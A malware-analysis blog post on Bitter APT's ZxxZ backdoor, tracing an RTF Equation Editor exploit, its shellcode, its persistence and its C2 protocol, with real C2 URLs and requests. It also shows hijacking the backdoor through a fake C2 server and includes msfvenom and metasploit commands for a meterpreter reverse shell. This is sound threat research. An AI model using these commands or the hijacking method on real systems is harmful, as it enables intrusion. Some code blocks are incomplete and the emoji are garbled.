## Introduction

[Bitter APT](https://malpedia.caad.fkie.fraunhofer.de/actor/hazy_tiger) (T-APT-17/APT-C-08/Orange Yali) is a group known to operate in South Asia and is suspected to be an Indian üáÆ‚Äçüá≥ APT. They primarialy target Pakistan üáµ‚Äçüá∞, Saudi Arabia üá∏‚Äçüá¶ and China.

## Analysis
This will be an indepth analysis of Bitter APT's backdoor named ZxxZ. We will cover almost every aspect of the attack chain including, exploit shellcode analysis, building our own C2 server to communicate with the malware and writing detection signatures for the community.

### Situational Awareness

[ShadowChasing1](https://twitter.com/ShadowChasing1) posted on Twitter of about new activity from the group.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Today our researchers have found new sample which belongs to <a href="https://twitter.com/hashtag/Bitter?src=hash&amp;ref_src=twsrc%5Etfw">#Bitter</a> <a href="https://twitter.com/hashtag/APT?src=hash&amp;ref_src=twsrc%5Etfw">#APT</a> group<br>ITW:bf1a905e11f4d44de8bd2e0a6f383ed5<br>filename:PAC Advisory Committee Report.doc<br>URL:<br>hxxps://sbss.com.pk/gts/bd.msi<br>hxxp://subscribe.tomcruefrshsvc.com/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php</p>&mdash; Shadow Chaser Group (@ShadowChasing1) <a href="https://twitter.com/ShadowChasing1/status/1478259210110775297?ref_src=twsrc%5Etfw">January 4, 2022</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

I decided to have a closer look just for fun. üòÖ

### Infection Chain
The sample is a [RTF](https://en.wikipedia.org/wiki/Rich_Text_Format) document purporting to be a Program Advisory Comittee (PAC) report. Based on some quick googling, [Pakistan](https://en.wikipedia.org/wiki/Pakistan) üáµ‚Äçüá∞ does have a [Public Accounts Comittee](https://agp.gov.pk/SiteImage/Misc/files/8_ecosai-circular-spring-issue-2020-article-Faisal%20Saeed%20Cheema.pdf). The PAC is responsible for regulating the use of public funds. If you are of course an adversary to Pakistan üáµ‚Äçüá∞, involving yourself in such afairs gives you better insight into the financial structure of a country. I'm not an expert in international affairs so if this is incorrect please DM me on [Twitter](https://twitter.com/c3rb3ru5d3d53c) and I'll make any nessasary corrections to this analysis. The exploit shellcode will download a MSI installer, which extracts a CAB Archive containing the final Portable Executable (PE) payload.

</div>

### Exploitation

The initial sample *PAC Advisory Committee Report.doc* (*sample_0.bin*), is an RTF document containing the Equation Editor exploit ([CVE-2017-1182](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882)). Although this exploit is quite old now, it is still used by threat actors to this day.

#### Extracting Shellcode

The exploit exists in object *4* in the RTF document and can be identified using *rtfdump*.

```bash
rtfdump.py --objects sample_0.doc
1: Name: b'Equation.3\x00'
   Magic: b'd0cf11e0'
   Size: 3584
   Hash: md5 32a758aab375df78e25fbee9d6db9ec4
```

Now that we have identified the suspicious OLE object, let's extract it.

```bash
rtfdump.py -s 4 -H -c "0x23:0xe23" -d sample_0.doc > sample_1.bin
file sample_1.bin
sample_1.bin: Composite Document File V2 Document, Cannot read section info
```

The first order of business is to check this out with __oledir__.

```bash
oledir sample_1.bin
```

This identifies to us that the CLSID *0002CE02-0000-0000-C000-000000000046* is being used in Root Entry and is likely related to [CVE-2017-1182](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882). 

Now to extract object *4* from the OLE, which contains the shellcode.

```bash
oledump.py sample_1.bin
  1:       102 '\x01CompObj'
  2:        20 '\x01Ole'
  3:         6 '\x03ObjInfo'
  4:       741 'Equation Native'
oledump.py -s 4 -d sample_1.bin > sample_2.bin
```

Seeing attacks like this many times now, since there is no visible URL the shellcode likely is encrypted. It never hurts to attempt a XOR bruteforce to see if you are successful or not.

```bash
xorbruteforcer.py sample_2.bin | strings
```

This yields us the following strings with a __0xff__ XOR key:
```bash
>GetPu
ddreu
CreateDirectoryA
C:\$Jz
LoadLibraryA
msi.dll
MsiSetInternalUI
MsiInstallProductA
hATSNhI=NOhITCAT
hxxp://sbss[.]com[.]pk/gts/bd[.]msi
FileA
C:\$Gts\gwsapip.exe
C:\$Gts\gw
LoadLibraryA
Shell32.dll
ShellExecuteA
C:\$Gts\gwsapip.exe
C:\Windows\explorer
open
```

This is a common mistake amongst threat actors from crimeware groups to APTs. We attack low skill encryption like this with pre-existing tools. Not to mention that [yara](https://github.com/VirusTotal/yara) also has [XOR string](https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor#xor-strings) functionality.

Using VirusTotal the URL <font style="color:red">hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font> provides us a Body SHA256 of [b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611](https://www.virustotal.com/gui/file/b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611/details), which can be found [here](https://www.virustotal.com/gui/url/d6755d5cd5ade55a4f1ea24d8872d8be6a626f97d37b090903a76d1d8147a40a/details).

Alright, we know where to find the next stage.

However, let's go a little deeper into analyzing the shellcode.

#### Shellcode Analysis
Once the malicious RTF document is opened and the user clicks *Enable Editing*, the *eqnedt32.exe* process will be created. The buffer is overwritten and the shellcode will then be executed.

In the OLE object we find the bytes *b2 13 40 00*, which stand out as an interesting pointer to *0x004013b2* as usually the address space for *eqnedt32.exe* will be in this range. This is easily possible because the DLL Characteristics of *eqnedt32.exe* is not compiled with ASLR or *IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE* enabled. Making the exploit more reliable.

```text
00000900  1c 00 00 00 02 00 22 c2  cc 0e 00 00 00 00 00 00  |......".........|

```

After setting a breakpoint in the debugger on the aforementioned address, we hit a few *return* instructions and then this decryption routine.

```asm
00464242 | B8 18404600              | mov eax,eqnedt32.464018                 |
00464247 | B9 2A020000              | mov ecx,22A                             |
0046424C | F610                     | not byte ptr ds:[eax]                   |
0046424E | 40                       | inc eax                                 |
0046424F | E2 FB                    | loop eqnedt32.46424C                    |
00464251 | 68 18404600              | push eqnedt32.464018                    |
00464256 | C3                       | ret                                     |
```

What we thought before was an *XOR* operation is actually in this case is a [not](https://www.felixcloutier.com/x86/not) operation.

> NOT - Performs a bitwise NOT operation (each 1 is set to 0, and each 0 is set to 1) on the destination operand and stores the result in the destination operand location. The destination operand can be a register or a memory location.

Thusly, performing *xor al, 0xff* then moving *al* to a memory location is equivelent to *not byte \[\<ptr\>\]*.

It would appear the threat actors did not consider this weakness in their shellcode decryption algorithm.

![xor_not_meme](/images/0.jpg)

The shellcode that starts being decrypted starts with a 3-byte *nop* sled and has a size of *0x22a* bytes, as indicated by moving *0x22a* into the *ecx* register when executing the *loop* instruction. Once it has finished decrypting the shellcode, the *return* instruction will set the instruction pointer to the beginning of the 3-byte nop sled.

After using the [TIB](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block) to obtain the linear address of the [PEB](https://en.wikipedia.org/wiki/Process_Environment_Block) and getting the address of *[kernel32.GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)*. It will get the address of *[kernel32.CreateDirectoryA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createdirectorya)* to create the directory *C:\\$Jz*.

Once the directory has been created, it will get the addresses of *[kernel32.LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)* and use it to load *msi.dll* into the *eqnedt32.exe* process. It will then call *[msi.MsiSetInternalUI](https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msisetinternalui)*. This will setup the installer's internal user interface. This is required for other subsequent calls to other installer functions.

After the function interface has been setup, it will call *[msi.MsiInstallProductA](https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msiinstallproducta)* with the following parameters. 

| Parameter     | Value                               |
| ------------- | ----------------------------------- |
| szPackagePath | <font style="color:red">hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font> |
| szCommandLine | ITCAI=NOATSNLL                      |

![MsiInstallProductA](/images/0.png)
*Figure 1: Equation Editor Shellcode Executing [msi.MsiInstallProductA](https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msiinstallproducta)*

This will result in the following traffic.

```http
GET /gts/bd.msi HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Windows Installer
Host: sbss.com.pk
```

This will execute the MSI installer silently on using the *eqnedt32.exe* process.

The site <font style="color:red">sbss[.]com[.]pk</font> appears to be a service that allows you to buy and sell property. It was created on Feb 15th, 2021 according to [PKNIC](https://pk6.pknic.net.pk/pk5/lookup.PK). Interestingly, the site is using Wordpress 5.8.3 at the time of this analysis. The previous version 5.8.2 had a major SQL Injection vulnerability [CVE-2022-21661](https://github.com/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection). It is not easily posible to determine what exactly happened to the website without access. It was either compromised or it was created by the threat actors themselves. This analysis will not go into the geopolitical aspects of tracing actors. We will save this for for another blog post.

Once completed, it will call *[kernel32.ExitProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess)* as to not arouse any suspicion from the user. 

Although, it may arouse some suspicion as the document is empty and does not contain any decoy text. ü§î

![Failed Decoy](/images/1.png)

### Post Exploitation
This section in the analysis will cover the post exploitation behavior of Bitter APT's ZxxZ backdoor.

#### MSI Installer
The MSI installer contains the file *sample_5.bin*, which is a [Cabinet](https://en.wikipedia.org/wiki/Cabinet_(file_format)) (or CAB) archive file for Windows. Once extracted, we get *sample_6.bin*, which is a Windows Portable Executable (PE). This can all be extracted using [7zip](https://www.7-zip.org/) and make it easy enough for us to gain access to the payload.

#### Payload Triage
We have finally arrived at the payload *sample_6.bin*.

I used [floss](https://github.com/mandiant/flare-floss) on the executable and got the following interesting strings.
```bash
floss sample_6.bin
subscribe[.]tomcruefrshsvc[.]com
update.exe
Updates
uer/sDeRcEwwQaAsSN.php?txt=
userlog.php?id=
WqeC812CCvU/
systemlog
systemlog
tmp.exe
```

This might be the C2 server and some of it's URI paths and parameters.

Opening *sample_6.bin* in [PEBear](https://github.com/hasherezade/pe-bear-releases), shows us that *ws2_32.dll* is present in the imports. This may give us easier insight to where the C2 communication is happening.

We can now hypothesize that this is the payload we are looking for.

#### Initialization
Once executed, it will use *[user32.LoadStringA](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-loadstringa)* to use strings from the resource string table. These strings indicate the project name is *NewProject*. These kind of artifacts are typically left behind when an application template code in Visual Studio was never provided a name and is certainly a heuristic indicator we can hunt for.

```cpp
LoadStringA(hInstance0,"NewProject_2.1",&lpWindowName,100);
LoadStringA(hInstance0,"NEWPROJECTT_21",&lpClassName,100);
RegisterWindowClass(hInstance0);
HINSTANCE_SELF = hInstance;
hWnd = CreateWindowExA(
	NULL, &lpClassName,
	&lpWindowName, WS_TILEDWINDOW,
	0x80000000, 0,
	0x80000000, 0,
	(HWND)NULL, (HMENU)NULL,
	hInstance0, (LPVOID)NULL);
```

Interestingly, they opt to use large negative values for the parameters *X* and *nWidth* as *0x80000000* will be *int* resulting in *-2147483648*. I don't believe there is much legitimate purpose to this. Maybe they were worried their window would show on the screen. üòÇ

Once completed creating the window, it will perform a decryption routine on the C2 server domain <font style="color:red">subscribe[.]tomcruefrshsvc[.]com</font>. This is performed with the following algorithm.

![algo](/images/4.png)
*Figure 3: String Decryption Algorithm (Simple XOR)*

After reverse engineering this algorithm we can implement the same routine in Python.

```python
def EncryptDecrypt(key, data):
	"""
	Bitter APT EncryptDecrypt Strings Function
	"""
    keylen = len(key)
    keypos = 0
    for i in range(0, len(data)):
        if data[i] == 0x00:
            break
        if keypos >= keylen:
            keypos = 0
        data[i] = data[i] ^ int(key[keypos].encode('utf-8').hex(), base=16)
        keypos += 1
    return data.decode('utf-8')
```

It is also possible to easily decrypt the strings in [CyberChef](https://gchq.github.io/CyberChef/) as well.

![cyberchef](/images/3.png)
*Figure 4: [CyberChef](https://gchq.github.io/CyberChef/) String Decryption*

At least here they are using 2-byte XOR keys. üòÇ

Then it will attempt to create the start creating a directory path string using *[CSIDL_LOCAL_APPDATA](https://docs.microsoft.com/en-us/windows/win32/shell/csidl)* (*C:\Users\\<username\>\AppData\Local*), if this was unsuccessful it will attempt to create *[CSIDL_TEMPLATES](https://docs.microsoft.com/en-us/windows/win32/shell/csidl)* (*C:\Users\\<username\>\Templates*) and *[CSIDL_SENDTO](https://docs.microsoft.com/en-us/windows/win32/shell/csidl)* (*C:\Users\\<username\>\SendTo*) respectively. 

```cpp
iResult = SHGetFolderPathA(NULL,CSIDL_LOCAL_APPDATA,NULL,NULL,&PATH);
if ((iResult != 0) && (iResult = SHGetFolderPathA(NULL,CSIDL_TEMPLATES,NULL,NULL,&PATH), iResult != 0)) {
	SHGetFolderPathA(NULL,CSIDL_SENDTO,NULL,NULL,&PATH);
}
```

Once completed, it will call *strcat_s* to append the path with string *\\\\Updates*. It will then call *\_mkdir* to create the directory *C:\\Users\\username\\\<path-type\>\\Updates*. Execution will continue until it appends the path with the string *systemlog*, in a very redundant way. üòÇ

![systemlog](/images/2.png)
*Figure 5: Obfuscated but not really string 'systemlog'.*

![obfuscation_fail](/images/1.jpg)

It will then call *[kernel32.Sleep](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep)* to sleep for 30 seconds. Once it has finished sleeping, it will check for the presence of the process *avp* ([Kaspersky](https://www.kaspersky.ca/)) and *MsMp* (Microsoft Security Monitor Process) and only establish persistence if those security processes are not present on the system. At least they are making an effort here to be stealthy and infect only poorly secured machines.

```cpp
bResult = IsProcess("avp");
if ((bResult == FALSE) &&
	(bResult = IsProcess("MsMp"),
	bResult == FALSE)){
	Persistence();
}
```

#### Persistence

To establish persistence, it will create the LNK file *%UserProfile%\Start Menu\Programs\Startup\update.LNK*, which points to *%UserProfile%\AppData\Local\Updates\update.exe*. 

```cpp
HRESULT Persistence(void){
  /*
  Bitter APT Persistence Function
  */
  HRESULT hResult;
  char cStartupPathLNK [250];
  
  CoInitialize((LPVOID)NULL);
  Sleep(1000);
  cStartupPathLNK._0_2_ = 0;
  memset(cStartupPathLNK + 2,0,248);
  hResult = SHGetFolderPathA(
	  (HWND)NULL,
	  CSIDL_STARTUP,
	  (HANDLE)NULL,
	  NULL,
	  cStartupPathLNK);
  if (hResult == 0) {
                    /* %StartUp%\\update.lnk */
    strcat_s(cStartupPathLNK,250,"\\");
    strcat_s(cStartupPathLNK,250,s_update_00406bb8);
    strcat_s(cStartupPathLNK,250,".");
    strcat_s(cStartupPathLNK,250,"l");
    strcat_s(cStartupPathLNK,250,"n");
    strcat_s(cStartupPathLNK,250,"k");
    hResult = CreateStartupLNK(cStartupPathLNK);
  }
  CoUninitialize();
  return hResult;
}
```

The *CreateStartupLNK* function, shown above, uses the COM Interface *Shortcut->IShellLinkA*. This corresponds to the following COM GUIDs.

| GUID                                 | Type        | Name        |
| ------------------------------------ | ----------- | ----------- |
| 00021401-0000-0000-c000-000000000046 | CLSID       | Shortcut    |
| 000214EE-0000-0000-C000-000000000046 | InterfaceID | [IShellLinkA](https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ishelllinka) | 

It will also set the LNK comment to *App*.

```cpp
hResult = CoCreateInstance(
	(IID *)&00021401-0000-0000-c000-000000000046,
	(LPUNKNOWN)NULL,
	1,
    (IID *)&000214EE-0000-0000-C000-000000000046,
    &ppv);
if (-1 < hResult) {
	pszFile = (LPCSTR)pszFileCheck;
	iLength = lstrlenA(&PATH);
	rLength = iLength + 1;
	LocalRealloc(&pszFile,pszFileCheck,rLength);
	eError = memcpy_s(pszFile,rLength,&PATH,rLength);
	ExceptionHandler(eError);
	(*ppv->lpVtbl->SetPath)(ppv,pszFile);
	// ...
```

Once the LNK in has been created in the startup folder, it will sleep for 20 seconds. Then it will copy itself to *%UserProfile%\AppData\Local\Updates\tmp.exe*. It will then create a handle to the file *%UserProfile%\AppData\Local\Updates\systemlog*, and write the characters *aa*.

Interestingly, at this stage it will use *[shell32.ShellExecuteA](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea)* to execute *%UserProfile%\AppData\Local\Updates\tmp.exe* (itself) before exiting its own process.

Once the *tmp.exe* (itself) has been executed again, it will skip over the persistence mechenisims discussed previously and begin collecting information about the machine. This information includes the *username*, *computername* and *productname*. This data will be stored in the URI parameter string *\<ComputerName\>&&user=\<Username\>&&OsI=\<ProductName\>*.

It will then call *[kernel32.CopyFileExA](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-copyfileexa)* to copy the aforementioned *tmp.exe* to *update.exe*. The following is the directory listing where the payload is stored for persistence.

```text
PS C:\Users\malware\AppData\Local\Updates> ls
    Directory: C:\Users\malware\AppData\Local\Updates
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         6/29/2022  11:07 PM          2 systemlog  (To check if installed)
-a---         6/29/2022   6:47 AM      53248 tmp.exe    (Payload)
-a---         6/29/2022   6:47 AM      53248 update.exe (Payload)
```

Persistence has now been established as it will surivive a reboot.

#### C2 Communication

Bitter APT's ZxxZ backdoor follows a minimal approach to C2 communication. The only command sent by the C2 server is the payload to execute next. This ensures that they can deploy new payloads at will anytime persistence is achieved. However, it will communicate with the C2 server every 17 seconds regardless if it has received any new payloads or not, which does generate noise on the infected network.


No payload is perfect. However, I can certainly see its appeal for a large scale offensive campaign from an operational perspective.

##### Behavior

The overall C2 behavior can be explained as follows.

![c2-overview](/images/5.png)
*Figure 6: High Level C2 Behavior Overview*

Now that we understand the high level concepts, let's discuss the details and see what the C2 traffic looks like.

Once persistence has been established, it will communicate to the C2 server using the string we identified earlier as the URI parameters.

```http
GET /VcvNbtgRrPopqSD/SzWvcxuer/userlog.php?id=MALWARE-PC&&user=yourmom&&OsI=Windows7Ultimate HTTP/1.1
Host:subscribe[.]tomcruefrshsv[.]com
Connection: close
```

The C2 checkin URI parameters are as follows.

| URI Parameter | Description  |
| ------------- | ------------ |
| id            | ComputerName |
| user          | Username     |
| OsI           | ProductName  |

Threat actors don't often realize that the omission of the *User-Agent* header makes the communication identifiable amongst legitimate browsing traffic. Not only this, but they are using *&&* for additional URI parameters. The standard is to use only one *&*, making this even more identifiable. It is common practice to pick on these mistakes and write very effective detection.

By using *dnsmasq* to change the C2 domain IP address it will allow us to write our own C2 server code to interact with the malware. Using *nslookup* we can confirm the C2 domain is now resolving to a local IP address we control.

```text
PS C:\Users\malware> nslookup subscribe.tomcruefrshsvc.com
Name:    subscribe.tomcruefrshsvc.com
Address:  10.0.2.1
```

Once the malware has sent its C2 checkin, it will then check the response for the first occurance of the *\<ComputerName\>\<Username\>* that it sent using *[strstr](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strstr-wcsstr-mbsstr-mbsstr-l?view=msvc-170)*.

```cpp
pcResult = strstr(C2Response,&ComputerNameUsername);
if (pcResult != (char *)NULL) {
	// <c2-ops-here>
}
```

After this has completed, it will parse between the double quotes for a process name. If a process name is provided, it will check to see if that process is currently running. If it is running, it will respond to the C2 server with the following response.

```http
GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=RNGZxxZexplorerZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
```

The format is *RNG\<delimiter\>\<process-name\>\<delimiter\>\<computername\>\<username\>*.  Interestingly, *RNG* is hardcoded and stored as a scalar operand in little endian.

```asm
mov dword ptr [CHAR_ARRAY_00407950], 0x474e52
```

If the process is not running, it will perform the following request.

```http
GET /VcvNbtgRrPopqSD/WqeC812CCvU/<payload> HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
```

It will then create the folder *%AppData%\\Local\\Debug*. If unsuccessful, it will instead create the directory *C:\\<username\>\\Templates*.

```cpp
hResult = SHGetFolderPathA((HWND)NULL, CSIDL_LOCAL_APPDATA, (HANDLE)NULL, NULL, pszPath);
if (hResult == NULL) {
	strcat_s(pszPath,250,"\\");
    strcat_s(pszPath,250,"Debug");
    _mkdir(pszPath);
} else {
	hResult = SHGetFolderPathA((HWND)NULL,CSIDL_TEMPLATES,(HANDLE)NULL,NULL,pszPath);
	if (hResult != 0) {
		return 0;
	}
}
```

Once the directory is created, it will concatenate the payload name with the extension *.exe*.  After this, it will write the first byte *M* manually, then write the rest of the payload sent from the C2 server to disk, ignoring the first 0xf65 bytes of data sent.

It will then make the following request to let the C2 server know the payload is being executed.

```http
GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=DN-SZxxZpayload.vbsZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
```

Once this has been sent to the C2 server, it will finally execute the payload using *[shell32.ShellExecuteA](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea)*.

![execute-payload](/images/6.png)
*Figure 7: Executing Payload with [shell32.ShellExecuteA](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea)*

After the payload has been executed, it will check to see if the processes was created successfully. This feature of course has timing issues for additional payloads sent by the C2 server that do not run in an infinite loop. üòÖ

If the payload process is running it will send the following request to the C2 server.

```http
GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=SZxxZpayloadZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
```

If the payload process is not running, it will send the following request to the C2 server.

```http
GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=RN_EZxxZpayloadZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
```

It will then sleep for *15* seconds and repeat the loop.

Interestingly, while they *obfuscated* (very poorly) the payload in the network traffic by prepending it with garbage data. They do not follow suit in storing their payloads in any obfuscated way on disk. Which means, they will have to be very careful not to be detected.

##### C2 Responses

At this point we can map out the following C2 responses and their meaning.

| C2 Response | Description                     |
| ----------- | ------------------------------- |
| RNG         | Payload is already running      |
| DN-S        | Payload is executing            |
| S           | Executed payload is running     |
| RN_E        | Executed payload is not running |

##### C2 Server Code

Now that we know everything there is to know about how Bitter APT's ZxxZ backdoor communicates with its C2 server. We can implement our own C2 server to manipulate it to execute our own payloads.

For this we will use [Python](https://www.python.org/) and [Flask](https://flask.palletsprojects.com/en/2.1.x/).

```python
#!/usr/bin/env python

app.run(debug=True, host='0.0.0.0', port=80)
```

When a C2 server is down, a great way to control the malware you are debugging is to run your own C2 server. This does come with its own challenges as we need to reverse engineer how the malware handles responses. But at least we are in control now! ü¶æ

To create our own payload we can do the following.

```bash
msfvenom --platform windows --arch x86 -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f exe -o payload.exe
```

We can now use this to execute our payload by performing the following.

```bash
./zxxz.py --host 0.0.0.0 --port 80 --debug --input payload.exe
```

Then in metasploit we need to setup our listener. Once we have the C2 server *zxxz.py* running, our payload created and *metasploit* listening for the *meterpreter* *reverse_tcp* callback. We can run the malware on the infected VM. This will yield us a successful execution of our own payload resulting in a *[meterpreter](https://www.metasploit.com/)* session.

```bash
msfconsole
> use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT <port>
msf6 exploit(multi/handler) > exploit

##### Proof of Concept (PoC)
In this Proof of Concept (PoC) video I use my own C2 server for Bitter APT's ZxxZ backdoor and send my own *meterpreter* payload to the infected machine.

##### Summary

This kind of C2 analysis is a lot of work. üë∑‚Äç‚ôÄ

However, please consider the following benifits.

- Reliable detection signatures
- Scanning the internet for other potential C2 servers
- Debug future samples easier when the C2 server is down

## Configuration Extraction
Since we now understand how the malware decrypts its strings, I created an automated configuration extractor for [mwcfg](https://github.com/c3rb3ru5d3d53c/mwcfg). The following is an example of how to perform extraction on Bitter APT ZxxZ samples you might have.

```bash
mwcfg --modules modules/ --input tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb --pretty
[
    {
        "name": "tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb",
        "type": "PE32 executable (GUI) Intel 80386, for MS Windows",
        "mime": "application/x-dosexec",
        "md5": "cc7ddf9ed230ad4e060dfd0f32389efb",
        "sha1": "05af416c3173cdb0b49d51db1db7b8f90639e3b8",
        "sha256": "09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe",
        "configs": [
            {
                "domain": "subscribe.tomcruefrshsvc.com",
                "family": "bitter_zxxz"
            }
        ]
    }
]
```

## Classification
I wouldn't call this malware a Remote Administration Tool (RAT) or a botnet for that matter. The functionality is quite simple. Accept a single command, which is the payload you wish to execute from the C2 server. With this in mind, I classify this malware as a backdoor.

## Conclusion
We reverse engineered Bitter APT's ZxxZ backdoor to the point we can repurpose it for our own red team operations. What I really wanted to show with this analysis and Proof of Concept (PoC), is that we need to be very careful with our attribution of threat actors. It is undeniably possible for one nation-state threat actor to frame another using similar methods. Based on this analysis, it would also not suprise me if this behavior is already happening in the wild.

![attribution](/images/7.png)

Cisco Talos also did an analysis on ZxxZ backdoor entitled [Bitter APT adds Bangladesh to their Targets](https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html). Although this is a great report, I wanted to do more with this malware to showcase what is possible.

I could certainly weaponize their code by writing a utility to patch the maldoc exploit and backdoor. However, I have decided against doing this as it would make it too easy for skiddies to parade around as Bitter APT and cause more mayhem for our industry.

Although I do poke fun at Bitter APT's mistakes, this attack chain from them shows that they are capable of being a notable threat to Pakistan üáµ‚Äçüá∞. While they are not delivering the most advanced attack in this example, these APT groups usually are large orgainzations of people with a large variety of skill levels. This malware would appear to be created by someone who is likely new to developing nation state quality malware. I wonder if they have quality control as part of their standard processes and procedures, perhaps we will never know. üòÖ

I think we successfully destroyed Bitter APT's ZxxZ backdoor now. üòú
